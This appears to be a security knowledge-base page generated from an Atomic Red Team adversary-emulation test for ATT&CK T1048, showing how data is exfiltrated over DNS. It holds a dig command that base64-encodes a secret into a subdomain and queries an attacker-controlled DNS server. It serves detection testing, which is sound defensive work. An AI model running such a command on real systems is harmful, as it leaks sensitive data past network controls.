---
atomic_guid: "a27916da-05f2-4316-a3ee-feec67a437be"
title: "Exfiltrate Data using DNS Queries via dig"
framework: "atomic"
generated: "true"
attack_technique_id: "T1048"
attack_technique_name: "Exfiltration Over Alternative Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048/T1048.yaml"
build_date: "2026-04-27 19:12:26"
executor: "bash"
aliases:
  - "a27916da-05f2-4316-a3ee-feec67a437be"
  - "Exfiltrate Data using DNS Queries via dig"
platforms:
  - "macos"
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This test demonstrates how an attacker can exfiltrate sensitive information by encoding it as a subdomain (using base64 encoding) and 
making DNS queries via the dig command to a controlled DNS server.

## ATT&CK Mapping

- [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048: Exfiltration Over Alternative Protocol]]

## Input Arguments

### attacker_dns_server

- description: Attacker's DNS server address
- type: string
- default: 8.8.8.8

### dns_port

- description: Attacker's DNS server port
- type: integer
- default: 53

### secret_info

- description: secret info that will be exfiltirated
- type: string
- default: this is a secret info

## Dependencies

dig command

### Prerequisite Check

```bash
which dig
```

### Get Prerequisite

```bash
which apt && sudo apt update && sudo apt install -y bind9-dnsutils || which yum && sudo yum install -y bind-utils || which dnf && sudo dnf install -y bind-utils || which apk && sudo apk add bind-tools || which pkg && sudo pkg update && sudo pkg install -y bind-tools || which brew && brew update && brew install --quiet bind
```

## Executor

- elevation_required: False
- name: bash

### Command

```bash
dig @#{attacker_dns_server} -p #{dns_port} $(echo "#{secret_info}" | base64).google.com
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048/T1048.yaml)
